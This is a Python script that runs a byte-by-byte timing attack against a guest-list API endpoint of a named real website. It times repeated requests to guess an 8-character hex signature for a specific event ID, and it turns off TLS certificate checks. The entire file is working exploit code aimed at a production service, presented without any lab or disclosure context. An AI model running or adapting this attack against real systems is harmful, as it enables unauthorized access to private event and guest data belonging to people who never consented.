#!/usr/bin/env python

import requests, time, logging, csv, operator
from collections import defaultdict
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logging.basicConfig()
logger = logging.getLogger('logger')
logger.setLevel(logging.DEBUG)

# input_attack_endpoint = 'https://local.paperlesspost.com/api/v1/guests?event_id={0}-{1}'
# input_eventid = 19295929
# input_signature = '7b9c70cf'

input_attack_endpoint = 'https://www.paperlesspost.com/api/v1/guests?event_id={0}-{1}'
input_eventid = 19295929
input_signature = '7b9c70cf'

SAVE_TO_CSV = False

byte_list = '0123456789abcdef'

def save_to_csv(results, position):
    if results:
        with open('results' + str(position) + '.csv', 'w') as f:
            writer = csv.writer(f, delimiter=',')
            for row in results:
                writer.writerow(row)
            logger.warning("Done Writing")    

def measure_request(signature, results):
    url = input_attack_endpoint.format(input_eventid, signature)
    # @TODO change to milliseconds
    elapsed_time = requests.get(url, verify=False).elapsed.total_seconds()
    results.append((signature, elapsed_time))
    logger.debug('signature: {0} | elapsed time: {1}'.format(signature, elapsed_time))

def determine_byte(position, results):
    logger.debug("Entering determine_byte")
    logger.debug("\n Position: {0} \n Results: {1}".format(position, results))

    results_dict = defaultdict(list)

    for r in results:
        results_dict[r[0]] = []

    logger.debug("Results dictionary initialized with signatures and empty arrays: \n {0}".format(results_dict))
    
    for r in results:
        logger.debug("Signature: {0}".format(r[0]))
        logger.debug("Elapsed times: {0}".format(results_dict[r[0]]))
        curr_array = results_dict[r[0]] 
        curr_array.append(r[1])

    averages = defaultdict(list)
    for signature, response_times in results_dict.items(): 
        logger.debug("Signature: %s - Elapsed times: %s" % (str(signature), str(response_times)))
        if len(response_times) < 2:
            raise IndexError('Getting an average requires at least 2 resposne times')   

        # compute average for all response times associated with the byte  
        average = sum(response_times) / len(response_times)       
        # set the average for the signature in a averages dictionary
        averages[signature] = average
    
    logger.debug("Averages for the byte: {0}".format(averages))

    # guess the byte based off the max averages across all posibilities
    guessed_byte = str(max(averages, key=averages.get))[position - 1 : position ]

    logger.debug("Guessed byte: {0}".format(guessed_byte))

    # clear out averages and results dictionaries
    averages.clear()
    results_dict.clear()
    
    return guessed_byte

def timing_attack(iterations=1):
    result_sig = ['0','0','0','0','0','0','0','0']
    position = 1
    count = 1
    while position < (len(result_sig) + 1):
        logger.warning("Iterating through bytes at position: {0}".format(position))
        results = []
        while count <= iterations:
            for c in byte_list:
                result_sig[position - 1] = c
                attack_sig = ''.join(result_sig)
                measure_request(attack_sig, results)
            count += 1         
        if SAVE_TO_CSV:
            save_to_csv(results, position)       
        result_sig[position - 1] = determine_byte(position, results)
        position += 1
        count = 1
    return result_sig

if __name__ == "__main__":
    logger.warning("Starting timing attack...")
    iterations = 50
    logger.warning("The attack will do {0} on each byte.".format(iterations))
    start = time.time()
    result = timing_attack(iterations)
    logger.warning("Guessing the hash is {0}".format(str(result)) )
    end = time.time()
    elapsed = (end - start)
    logger.warning("Finished executing attack. Attack took {0} seconds to complete.".format(elapsed) )

        
        


